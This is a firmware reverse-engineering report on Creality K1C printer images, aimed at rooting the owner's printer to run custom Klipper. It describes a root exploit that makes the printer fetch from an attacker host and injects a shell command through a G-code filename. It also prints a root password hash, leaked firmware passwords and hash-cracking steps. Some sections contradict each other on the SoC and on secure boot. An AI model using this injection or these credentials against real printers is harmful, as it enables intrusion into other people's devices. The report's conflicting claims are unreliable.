# Creality K1C Firmware Review — QEMU-backed RE Analysis

**Date:** 2026-07-12 (**materially corrected 2026-07-28** — see §0.0)
**Analyst:** automated RE pass (binwalk / squashfs-tools / dtc / qemu-user-static)
**Scope:** static extraction + mapping of two firmwares, plus live emulation of the target rootfs under QEMU.
**End goal (context):** full custom Klipper on the 2025 K1C to run a Cartographer3D v4 probe and get better bed leveling.

---

## 0.0 Hardware Varients
There are **three** distinct platforms, and the SoC axis (X2000E vs X2600) is *orthogonal to* and more important
than the S11/S12 filename axis:

| | **A — S11** | **B — S12** | **C — C13 (your printer)** |
|---|---|---|---|
| Board | `CR4CU220812S11` | `CR4CU220812S12` | **`CR4SU200382C13`** |
| SoC | Ingenic X2000E | Ingenic **X2000E** | Ingenic **X2600** |
| Firmware in repo | `..._ota_img_V2.3.5.34.img` | `..._ota_X2000E_V1.1.0.27...img` | **not in repo** (device backup only) |
| Version string | 2.3.5.34 | `X2000E_V1.1.0.27.20251225` | `K1C-2025_V1.0.0.22.20250711S` |
| Klipper profile | — | `<model>-x2000-cfs-c` | `<model>-x2600` (no `-cfs-c`) |
| Main MCU | ext. chip `/dev/ttyS7` | ext. chip **`/dev/ttyS7`** | on-SoC **`/dev/rpmsg_mcu`** |
| Boot chain | — | CRC32 only, no crypto | **SCBT-encrypted** SPL/u-boot/kernel; **signed** rootfs |

**Evidence that image B is X2000E, not X2600** (all from the image itself):

- Kernel `.config`: `CONFIG_SOC_X2000=y`, `# CONFIG_SOC_X2600 is not set`
- `CONFIG_DT_X2000_MODULE_BASE_DTS_FILE="x2000_module_base_mmc0_klipper_CR4CU220812S11.dts"`
- DTB `compatible = "ingenic,x2000_module_base\0ingenic,x2000"` — **zero** x2600 nodes in `kernel.dts`
- `/etc/version` = `X2000E_V1.1.0.27.20251225`
- `apps/etc/init.d/CS55klipper_service` hardcodes `MODEL="$model-x2000-cfs-c"` → `[mcu] serial: /dev/ttyS7`

**Ground truth for your printer** (`backups/firmware_full_20260728.tar`, `analysis/exploit_review/C13_README.md`):
board `CR4SU200382C13`, firmware `K1C-2025_V1.0.0.22.20250711S`, klippy.log reports `MCU=x2600`, and
the C13 `CS55klipper_service` hardcodes `MODEL="$product-x2600"`.


 **The one genuinely useful C13 conclusion:** Klipper lives at `/usr/apps/usr/share/klipper` on **p8**,
   which is **unencrypted, unsigned, and writable**. That — not an OTA rootfs swap — is the correct
   injection target, and it is what `k1-2025-cartographer/install.sh` already uses.

---

## 0. TL;DR (platform B — `CR4CU220812S12`, X2000E )

| | **A — S11 (2.3.x)** | **B — S12 (1.1.0.27)** |
|---|---|---|
| File | `CR4CU220812S11_ota_img_V2.3.5.34.img` | `CR4CU220812S12_ota_X2000E_V1.1.0.27.20251225.img` |
| Mainboard | `CR4CU220812S11` | `CR4CU220812S12` |
| SoC | Ingenic X2000E (XBurst2, MIPS) | Ingenic **X2000E** (`CONFIG_SOC_X2000=y`) |
| Container | **encrypted 7z** (AES-256, header-encrypted) | **plain custom OTA wrapper** (unencrypted) |
| Main MCU | discrete UART chip on `/dev/ttyS7` | discrete UART chip on `/dev/ttyS7` (`[mcu rpi]` present but **commented out**) |
| Bed probe | `prtouch_v2` (strain gauge) | `prtouch_v3` (strain gauge) |
| Kernel | (not decrypted) | Linux **5.10.186**, MIPS, SMP PREEMPT |
| Root via UART | getty **with login** (needs pw) | getty `-n -l /bin/sh` → **unauthenticated root** |
| SSH | dropbear present | dropbear present, root login allowed w/ password |
| Secure boot | n/a | no crypto at kernel/rootfs layer; CRC32 only. **Does not generalise to C13** — see §0.0 |

> **UPDATE (root obtained):** the owner has root on the real printer via the **C0DEbrained "K1C 2025" exploit** (application-layer RCE through the `vectorp`/`wsslicer` daemon — *not* a boot bypass). This corrects Section 6 — see the new **Section 9** for exploit mechanics and the accurate secure-boot picture. Net effect on the goal: **custom Klipper is achievable without touching any secure-boot-protected partition** — inject it into writable `/usr/data` and `mount --bind` over the stock paths.

**Bottom line:** the *kernel/rootfs layer has no integrity enforcement at all* — no dm-verity/FS-verity/module signing, the kernel carries **only a CRC32** (no signature), and the OTA updater does **no signature check and no anti-rollback**. `/usr/data` is writable. So custom Klipper is clearly achievable. Secure boot **probably** exists but only over **BootROM→SPL→u-boot** (efuse + TRNG hardware is present; the bootloader is not shipped in the OTA so it can't be verified from these files) — see §9.2. Practical hurdles: (a) the main MCU now lives inside the SoC (`rpmsg_mcu`) so there's no separate main-board chip to reflash, (b) no `overlayfs` in the kernel → changes go in via `mount --bind` or a repacked squashfs, (c) Klipper's Python ships compiled (`.pyc`) with Creality-specific extras, and (d) **no vendor recovery** — so treat kernel/bootloader writes as the one genuinely dangerous class of change until u-boot is dumped and inspected.

---

## 1. Analysis environment

Host: Ubuntu 24.04, kernel 6.17, x86-64. Tooling installed for this review:

- `binwalk`, `p7zip-full`, `squashfs-tools` (LZO-capable `unsquashfs`), `device-tree-compiler`, `u-boot-tools`, `mtd-utils`, `ubi_reader`
- `qemu-user-static` (all arches incl. `qemu-mipsel-static`) with binfmt handlers registered
- `qemu-system-mips` / `qemu-system-arm` (full-system, available if needed)

Working tree: `analysis/` (extractions under `analysis/extract/`, unpacked rootfs under `analysis/rootfs/`).

---

## 2. Container / packaging formats

### 2.1 NEW — `...S12...V1.1.0.27` : custom Creality OTA wrapper (unencrypted)

Header (first ~0x700 bytes) is a plaintext descriptor + partition table:

- `0x00` image filename, `0x80` `"Creality x2600 software"`, `0xC0` build timestamp `20251225153931`
- `0x120` global header: total size `0x0a7d3468` (175,977,576 = file size), partition count `6`
- Then six 224-byte partition records. Decoded table:

| eMMC target | Source file | Payload size | Offset in .img |
|---|---|---|---|
| `mmcblk0p3` | `..._zero_...bin` (boot logos/splash) | 0x000ACDAC (707 KB) | 0x0000067C |
| `mmcblk0p4` | `..._zero_...bin` (A/B copy) | 0x000ACDAC | 0x0000067C |
| `mmcblk0p5` | `..._linux-xImage_...` (kernel) | 0x00724040 (7.14 MB) | 0x000AD428 |
| `mmcblk0p6` | `..._linux-xImage_...` (A/B copy) | 0x00724040 | 0x000AD428 |
| `mmcblk0p7` | `..._rootfs-deplib_...squashfs` | 0x0A002000 (160 MB) | 0x007D1468 |
| `mmcblk0p8` | `..._rootfs-deplib_...squashfs` (A/B copy) | 0x0A002000 | 0x007D1468 |

Each record carries a CRC32 (per-partition). **Integrity is CRC only — there is no digital signature.** Note the **A/B dual-bank layout**: every payload is flashed to two partitions for failsafe OTA.

### 2.2 OLD — `...S11...V2.3.5.34` : AES-256 encrypted 7z

Starts with the 7z magic `37 7A BC AF 27 1C`. Header encryption is on (`-mhe`), so even the file list is AES-encrypted.

- Community password for **pre-2.x** K1 images is `qH5i25Vd0kiFQl4B` (log files use `0755cxsw$888`). **These do not open 2.3.5.34** — Creality rotated the firmware password for the 2.x generation and it is not publicly available. Brute-forcing AES-256 is not practical.
- The device's own updater would hold the key, but the new S12 firmware ships the *new* unencrypted format and its updater (`nexusp`) contains no legacy 7z password.
- **Result:** the exact 2.3.5.34 file was not decrypted. The old-board analysis below is substantiated from the public community extraction of an S11-board firmware (architecturally representative; version differs).

> The packaging change itself (encrypted 7z → plain wrapper, but with A/B banks and per-partition CRC) is part of Creality's platform redesign, not a hardening step — the new format is *easier* to unpack.

---

## 3. NEW firmware (1.1.0.27) deep dive

### 3.1 SoC & kernel

- **Ingenic X2600**, XBurst2, MIPS32r2, little-endian (mipsel), o32 ABI, nan2008. Dual-core (SMP PREEMPT).
- Toolchain string: `Ingenic Linux-Release5.1.8-Default_xburst2_glibc2.29`, gcc 7.2.0.
- Kernel: **Linux 5.10.186**, built `Thu Dec 25 2025`. uImage load/entry `0x80F00000`, wrapped as Ingenic "xImage" (gzip `vmlinux.bin` + trailing xz).
- Embedded **DTB** (28.5 KB) and a built-in **initramfs** (xz cpio) inside vmlinux.

**Kernel command line (from DTB `chosen/bootargs`):**
```
console=ttyS2,115200n8 mem=242M@0x0 rmem=14M@0xf200000 rdinit=/linuxrc
initcall_debug clk_ignore_unused root=/dev/ram0 rootwait rootfstype=ramfs rw
```
→ `/` is the RAM disk built into the kernel; init is `/linuxrc` (→ busybox).

**Security-relevant kernel `.config` (recovered from vmlinux):**
- `CONFIG_FS_VERITY` **not set**; no `DM_VERITY`; no `MODULE_SIG_*`. No verified boot / no signed modules.
- `CONFIG_LSM="lockdown,yama,loadpin,safesetid,integrity,bpf"` — compiled in but **not** activated via bootargs (no `lockdown=` / `module.sig_enforce`).
- `CONFIG_DEVMEM=y` (open `/dev/mem`), `CONFIG_MIPS_CMDLINE_FROM_DTB=y` (cmdline lives in the DTB), `CONFIG_SQUASHFS_LZO=y`.
- Full **CAN** stack: `CONFIG_CAN=y`, `CAN_RAW`, `CAN_GW`, and USB-CAN drivers `CAN_8DEV_USB`, `CAN_EMS_USB`, `CAN_ESD_USB2`.

### 3.2 Full eMMC partition map (kernel + `seed.sh` + `x2000_get_sn_mac.sh`)

| Part | Purpose | FS | Mount |
|---|---|---|---|
| `mmcblk0p1` | OTA/boot selector (`ota:kernel2` flag → A/B) | raw | — |
| `mmcblk0p2` | `sn_mac` factory block (serial, MAC, board type, structure ver) | raw | — |
| `p3` / `p4` | boot logo / splash ("zero") A/B | raw | — |
| `p5` / `p6` | kernel (xImage) A/B | raw | — |
| `p7` / `p8` | rootfs-deplib **squashfs** (LZO) A/B → provides `/usr` (`/usr/deplibs`, `/usr/apps`) | squashfs (RO) | `/usr...` |
| `p10` | **userdata** (rw) | ext4 | `/usr/data` |

`seed.sh` (sourced by `rcS`) mounts these and chooses the active bank by reading the `ota:kernel2` flag from `p1`. `p10` is `fsck`'d / recreated with `mke2fs` if missing.

### 3.3 Filesystem model

- **Base `/`** = kernel initramfs: busybox 1.31.1, glibc 2.29, loader `/lib/ld-linux-mipsn8.so.1`, `/etc`, `/sbin`, `/bin`. This is where `inittab`, `shadow`, `init.d/S*` live.
- **`/usr`** = the 160 MB `rootfs-deplib` squashfs (what the OTA ships). Contains the whole userland: `bin/` (hundreds of tools incl. `candump`/`cansend`, bluetooth, alsa, 7z), `lib/`, and `apps/` (Creality app tree), `share/klipper`, `share/moonraker`, `share/klippy-env` (Python 3.8.2 venv).
- **`/usr/data`** = ext4, writable, holds `printer_data/` (config, gcodes, logs, database) — standard Moonraker layout.

`/usr` is **read-only squashfs and there is no overlay** — the `mount -o remount,rw /` line in `inittab` is commented out. Persisted user changes only survive in `/usr/data`.

### 3.4 MCU / motion architecture (the "new single board")

From `config/k1c-x2600-cfs-c/printer.cfg`:

```
[mcu]            serial: /dev/rpmsg_mcu     ← main MCU = on-SoC coprocessor (RPMsg), restart via script
[mcu nozzle_mcu] serial: /dev/ttyS3  @230400
[mcu leveling_mcu] serial: /dev/ttyS4 @230400
```

- **Main MCU is no longer a discrete chip.** On the old S11 board it was `[mcu] serial: /dev/ttyS7` (an external GD32/STM32-class part) plus a `[mcu rpi]` host MCU. On the new X2600 board Creality moved the main-MCU firmware onto the SoC's second core, exposed to Linux as `/dev/rpmsg_mcu` (remoteproc/RPMsg). This is the chip/board change you were told about.
- Kinematics **CoreXY**, 220×220×250. Probe is **`prtouch_v3`** (nozzle strain-gauge), Z homing via `probe:z_virtual_endstop`. `[bed_mesh]` 7×7 bicubic.
- Also present in klippy extras (for other models / CFS): `probe_eddy_current`, `creality_ldc1612` (LDC1612 inductive sensor — same chip family Cartographer uses), `bltouch`, `z_tilt`, `quad_gantry_level`.

### 3.5 Klipper / Moonraker stack

- Creality fork, built on Jenkins: path `...IngenicX2000E-cfs-c-k1c-5.10-kernel-2000-build/.../klipper-creality/klippy/klippy.py`.
- **klippy shipped as `.pyc` only** (191 compiled modules, 0 `.py`). Custom option `--check-fw`. Creality-specific extras: `creality_features`, `creality_rom_manager`, `creality_safe_home`, `creality_quick_control`, `creality_power_less`, `creality_ldc1612`, `creality_multi_probe`, `prtouch_v3`, etc.
- **No `cartographer` / `scanner` / `beacon` module present** — expected; you supply it.
- Config profiles cover both SoCs and all models: `k1c-x2600-cfs-c`, `k1c-x2000-cfs-c`, `k1-*`, `k1max-*`, `k1se-*`, `ender3v3-*`. Model chosen at boot from `sn_mac`.
- Web UI: **Fluidd** (via nginx). Services under `apps/etc/init.d/`: `CS55klipper_service`, `CS56fluidd`, `CS50nginx`, `CS60gui_service`, plus closed Creality daemons (`solusp`, `nexusp`, `quintusp`, `onyxp`, `alchemistp`, `thirteenthp` — OTA/UI/AI/CFS logic).

### 3.6 Accounts, auth, remote access

- `/etc/passwd`: `root` (`/bin/sh`), `creality` (uid 1001, `/bin/sh`).
- `/etc/shadow`:
  - `root:$1$MGJwuoXq$3F8Ejy1fqMROnB4J8tx5..` — **MD5-crypt** (weak, crackable; not in a common wordlist so far).
  - `creality:$5$lxhiY7QShwrKG./8$K00Z...` — SHA-256.
- **`/etc/inittab`:** `ttyS2::respawn:getty -n -l /bin/sh -L 115200 ttyS2` → the **UART debug console spawns a root shell with no login prompt**. Physical access to the ttyS2 pads = instant root. (Old board required a normal `getty` login.)
- **`S50dropbear`** starts SSH unconditionally with args `-R` only (no `-w`), so **root SSH login is permitted with the password**. Default port 22.
- `usb_adb_enable.sh` can bring up an Android ADB gadget on the USB-OTG port.

---

## 4. QEMU emulation results

The firmware's own MIPS userland was executed under `qemu-mipsel-static` in a chroot assembled from the extracted **base initramfs** (busybox + glibc + loader) with the **`/usr` squashfs** bind-mounted in:

- `bin/busybox` → **BusyBox v1.31.1 (2025-02-24)** runs; `/bin/sh` runs; `id` → `uid=0(root)`; `uname -m` → `mips`.
- Firmware Python: `/usr/share/klippy-env/bin/python3 --version` → **Python 3.8.2** runs under emulation.
- **Creality's Klipper runs under QEMU:** `python3 .../klippy.pyc -h` prints its option list, including the Creality-only `--check-fw` flag. This confirms the compiled klippy and its C helper bindings load and execute in emulation.
- Creality shell tooling (`x2000_get_sn_mac.sh`, etc.) executes; it reads the `sn_mac` block from `/dev/mmcblk0p2` (absent in emulation, as expected — no eMMC).

> Full-system boot (`qemu-system-mipsel`) is not turnkey: there is no upstream QEMU machine model for the Ingenic X2600, and the kernel takes its cmdline/peripherals from a board-specific DTB. `qemu-user` chroot is the practical and sufficient path for reviewing/executing the userland (Klipper, Moonraker, Creality binaries). A full-system board model could be built later if hardware-in-the-loop MCU emulation is ever needed.

---

## 5. S11 → S12 comparison 

| Aspect | S11 board, 2.3.x | S12 board, 1.1.0.27 |
|---|---|---|
| SoC | Ingenic X2000E | Ingenic X2000E |
| Packaging | encrypted 7z (rotated pw) | plain OTA wrapper, A/B banks, CRC32 |
| Main MCU | external chip `/dev/ttyS7` + `[mcu rpi]` host | external chip `/dev/ttyS7`; `[mcu rpi]` commented out |
| MCU updater | `S13mcu_update` service present | `S13mcu_update` service present |
| Probe | `prtouch_v2` | `prtouch_v3` |
| UART console | `getty` **with login** | `getty -n -l /bin/sh` → **direct root** |
| Extra daemons | `cx_ai_middleware`, `webrtc`, `wipe_data`, `start_app` | `solusp/nexusp/quintusp/onyxp/alchemistp/...` |
| Secure boot | none | none at kernel/rootfs layer |

S11 → S12 is a **firmware-generation change on the same X2000E SoC** (packaging, daemons, probe
revision, an open UART console), not an SoC change. The **SoC change is a separate axis**: the 2025
machines moved to the X2600 (`CR4SU200382C13`), which is where the integrated `rpmsg_mcu` main MCU and
the SCBT-encrypted boot chain actually live. Do not read this table as "old vs new" — see §0.0.

---

## 6. Security assessment (root access)

**Confirmed root vectors on 1.1.0.27:**
1. **UART / serial console (ttyS2, 115200 8N1):** unauthenticated root shell. Requires locating the debug pads on the X2600 board. This is the guaranteed, no-crack path.
2. **SSH (dropbear):** root login enabled if you have/crack the root password. Root hash is MD5 (`$1$`), so it is realistically crackable with hashcat mode 500 given a decent wordlist/rules run.
3. **ADB gadget:** `usb_adb_enable.sh` over USB-OTG.

**What is *not* in the way:**
- No dm-verity/FS-verity, no signed modules **at the kernel/rootfs layer** → a modified *rootfs* isn't rejected by the kernel. **BUT** the boot chain below the kernel *is* secured (see Section 9): Ingenic RSA-2048 verifies SPL/u-boot, so a modified *kernel or bootloader* is rejected/halted. Modify the rootfs, not the boot chain.
- OTA payloads are only CRC32-checked; a modified image with a recomputed CRC passes.

**What *is* in the way (practical friction, not crypto):**
- Root FS (`/usr`) is read-only squashfs with **no overlay**; edits don't persist unless you either write into `/usr/data` or repack+reflash the squashfs.
- klippy is `.pyc` with Creality extras entangled (`creality_features`, `creality_rom_manager`, etc.); wholesale replacement risks breaking the Creality UI/GUI daemons that talk to Moonraker/klippy.
- Main MCU is on-SoC (`rpmsg_mcu`) — its firmware is coupled to the kernel image, so "flash the mainboard MCU" is really "rebuild the kernel/coprocessor image."

---

## 7. Roadmap → custom Klipper + Cartographer v4 (better bed leveling)

Two broad strategies; both are feasible because there's no secure boot.

**A. Least-invasive (keep Creality's stack, add Cartographer):**
1. Get root (UART is safest).
2. Cartographer connects as an **extra MCU**. **There is only one USB port (single dwc2 OTG) and NO native CAN controller in the DTB** (no `can@` node — the X2600's CAN peripheral is not routed/enabled). Therefore CAN would require a **USB-CAN dongle on that same single port** and buys nothing — **use USB mode.** The kernel does support USB-CAN if ever needed: `gs_usb` (BTT U2C/candleLight), `8devices`, `EMS`, `ESD` are all `=y`, plus `slcan`/`slcand` userland.
3. Add the Cartographer klippy module. Because klippy is `.pyc`, drop the Cartographer `scanner.py`/`cartographer.py` extra into `klippy/extras/` (Klipper imports extras by name; a `.py` sits fine alongside `.pyc`). This requires a **writable** `klippy/extras` → repack the `rootfs-deplib` squashfs (Section B) or relocate klippy to `/usr/data` and launch from there.
4. Add `[scanner]`/`[cartographer mcu]` + `[bed_mesh]` blocks to a `printer.cfg` in `/usr/data/printer_data/config`, remove/replace `prtouch_v3` Z-homing. Flash Cartographer's own MCU firmware (its RP2040) off-device.

**B. Full custom (repack/reflash rootfs, or mainline Klipper):**
1. Modify `analysis/rootfs/s12` (add extras, real `.py` klippy, Moonraker `update_manager` allowances, enable persistent SSH keys).
2. `mksquashfs` with **LZO, 128K block, 4K device block** (match the original superblock) → new `rootfs-deplib.squashfs`.
3. Rebuild the OTA image: replace the p7/p8 payload, fix the size field and **recompute the per-partition CRC32** in the header (offsets documented in Section 2.1), or flash the squashfs straight to `mmcblk0p7`/`p8` from a root shell.
4. Keep the A/B banks in mind — flashing only one bank lets you fall back.

**Hard constraints to design around:**
- The on-SoC `rpmsg_mcu` main board can't be swapped for stock Klipper firmware the way a USB-serial mainboard can; leave it as-is and add Cartographer as an auxiliary MCU rather than replacing the main MCU.
- Cartographer duplicates the LDC1612 eddy-current tech Creality already ships (`creality_ldc1612`), so the sensor class is well within what the board/kernel already supports — the gap is purely the Klipper Python module + a connection bus, not hardware capability.

---

## 8. Open items / suggested next steps

1. **Decrypt 2.3.5.34** — needs the rotated 2.x 7z password (not public). Options: pull it off a running S11 printer's updater, or accept the public extraction used here for comparison.
2. **Confirm on real hardware:** location of ttyS2 debug pads; whether the USB-OTG port can do host mode while CFS/ADB are idle; whether `rpmsg_mcu` restart script survives added MCUs.
3. **Crack the root MD5 hash** (hashcat -m 500) to enable SSH without opening the case.
4. **Squashfs repack dry-run:** rebuild `analysis/rootfs/s12` → squashfs and diff superblock params against the original to lock down exact `mksquashfs` flags before touching the printer.
5. Decide strategy A vs B; A is lower-risk for a first Cartographer bring-up.

---

## 9. Root via the C0DEbrained exploit + accurate secure-boot picture

**Source:** `gist.github.com/C0DEbrained/c6f508109e34f43a39f4c22e901408dd` ("Creality K1C 2025 Root Exploit"). Cross-validated below against the extracted firmware — the claims line up.

### 9.1 How the exploit works (application-layer RCE, not a boot bypass)
1. Connects to the printer's **`wsslicer` WebSocket on port 9999** and sends a `{"method":"set","params":{"print":"http://HOST:4444/exploit-..."}}` job.
2. The printer fetches that URL; the attacker's HTTP server returns a `Content-Disposition: attachment; filename="dest\";<SHELL CMD>;#exploit.gcode"` — a **command injection through the G-code filename**.
3. Chain: `bootstrap.sh` → `privesc.py` (`os.setuid(0)`) → `S999persistence`, which drops your **ECDSA pubkey into `/root/.ssh/authorized_keys`**, (re)generates dropbear host keys, and flips `/etc/passwd` shells from `nologin` to `/bin/sh`.
4. You then `ssh root@printer` with your key.

**Confirmed in firmware:** the `wsslicer` service is served by **`/usr/apps/usr/bin/vectorp`** (Creality's "vectorprime" daemon — build path `.../vectorprime/services/wsslicer/wsslicer_server.c`). `vectorp` is also the only binary referencing `/dev/sc` / `cmd_sc` / `soc_security`, i.e. it's both the RCE entry point and the userspace face of secure boot.

### 9.2 Secure boot — CORRECTED, evidence-based assessment

> **Correction:** an earlier revision of this report stated secure boot was confirmed. **It is not.** That claim came from the exploit gist, and the supposed cross-validation was a false-positive grep (`cmd_sc` matched `wifi_cmd_scan_results`). Restating honestly:

**Evidence the hardware supports it:**
- DTB has `efuse@0x13540000` (`ingenic,x2000-efuse`) and `dtrng@0x10072000` — OTP fuse + hardware RNG blocks present.
- Ingenic X2000/X2600 SoCs do support OTP-key secure boot.
- The exploit author reports seeing "secure boot" in **U-Boot console output on a real device** — first-hand, but not reproducible from the OTA (the bootloader is **not** shipped in the OTA image).

**Evidence it does NOT extend above u-boot:**
- `soc_security.ko` is **absent** (27 modules present; not one of them) — contradicts the gist's stated `/dev/sc` implementation.
- `vectorp` contains **no** `/dev/sc` or `cmd_sc` string.
- Kernel `uImage`: payload size + 64-byte header == exact file size → **zero trailing bytes, no appended signature**. Protected by **CRC32 only**.
- OTA updater (`upg_check_flag`/`upg_do` in `seed.sh`): parses `action:upg`/`path` from a plain text state file, then writes the inactive A/B bank. **No signature verification, no version comparison, no anti-rollback.**
- Kernel config: no dm-verity, no FS-verity, no module signing.

**Most probable arrangement:** BootROM verifies SPL → SPL verifies u-boot, and the chain **stops there**; u-boot loads the kernel with a CRC check only. If so, **custom kernels are likely possible** — which would re-open overlayfs, a fuller custom Klipper, etc.

**To settle it (on-device):**
1. `dd` the boot area / first ~1 MB off eMMC and analyze u-boot for signature-verification code and "bad signature"-style strings.
2. Watch U-Boot console output over the ttyS2 UART at power-on.
3. Inspect efuse state via the `ingenic,x2000-efuse` driver — are key hashes actually burned?

**On downgrade / "extract the hash and sign our own":** not possible — secure boot is asymmetric; the device holds only the **public** key, and Creality's **private** key is not in the firmware. However **downgrade needs no forgery**: an older *officially signed* image is already valid, and the updater enforces **no version ordering**, so rollback is viable at the software layer if an older X2600/S12 OTA can be obtained. Relevant mainly if a printer ships with the `wsslicer` hole already patched.

**Practical upshot:** because the OTA path is CRC-only, a **modified rootfs squashfs (CRC corrected) can likely be flashed to the inactive bank via Creality's own updater** — a persistence route that is A/B-safe.

### 9.3 Revised roadmap — Cartographer with root already in hand
Because you have root and must stay clear of secure-boot-protected regions, the clean path is **inject, don't reflash**:
1. **Work entirely in `/usr/data`** (writable, unverified). This is also how the Guilouz "rooted firmware" ecosystem operates.
2. **Add the Cartographer Klipper module.** Kernel has **no `overlayfs`**, so use **`mount --bind`** (busybox mount supports it): place a modified `klippy/` (with Cartographer's `scanner.py`/`cartographer.py` extra, and any `.py` you need to shadow a Creality `.pyc`) under `/usr/data/...` and bind-mount individual files/dirs over `/usr/share/klipper/klippy/extras/`. A boot hook in `/usr/data` re-applies the binds after each reboot (init scripts on the RO rootfs can't persist).
3. **Connect the Cartographer over USB** (the one OTG port, host mode). There is **no native CAN** on this board, so CAN would only mean adding a USB-CAN dongle on the *same* single port — no benefit. (USB-CAN drivers incl. `gs_usb` are compiled in should a future multi-device CAN bus ever be wanted.) Flash the Cartographer's own RP2040 off-device.
4. **Config:** add `[scanner]`/`[cartographer mcu ...]` + `[bed_mesh]` to a `printer.cfg` in `/usr/data/printer_data/config`; retire `prtouch_v3` Z-homing in favor of the scanner probe. Leave the on-SoC `[mcu] /dev/rpmsg_mcu` main MCU **stock**.
5. **Do NOT** try to reflash p5/p6 (kernel), p8 (verified apps), or the bootloader — that's what secure boot guards, and there is **no recovery** for this board if it halts/bricks.

### 9.4 Note on firmware `.26`/`.27`
The exploit mentions a `.26` release adding an encrypted `/usr/data/permission` file for an *official* signed-USB root unlock. Your firmware is **`1.1.0.27`** (after `.26`), so that official path exists but requires Creality's signed permission blob — the exploit is the unofficial route around it.

---

## Appendix — artifact locations

```
analysis/extract/s12/p5_kernel.uImage        kernel (Ingenic xImage)
analysis/extract/s12/vmlinux.bin             decompressed kernel
analysis/extract/s12/kernel.dts              decompiled DTB (bootargs, peripherals)
analysis/extract/s12/blob_7731d8.bin         kernel .config
analysis/extract/s12/base_root/              base rootfs (initramfs: busybox, glibc, /etc, shadow)
analysis/extract/s12/p7_rootfs.squashfs      /usr rootfs-deplib (LZO squashfs)
analysis/rootfs/s12/                          unpacked /usr (Klipper, Moonraker, Creality apps)
analysis/notes/parse_ota2.py                  OTA header/partition-table parser
```
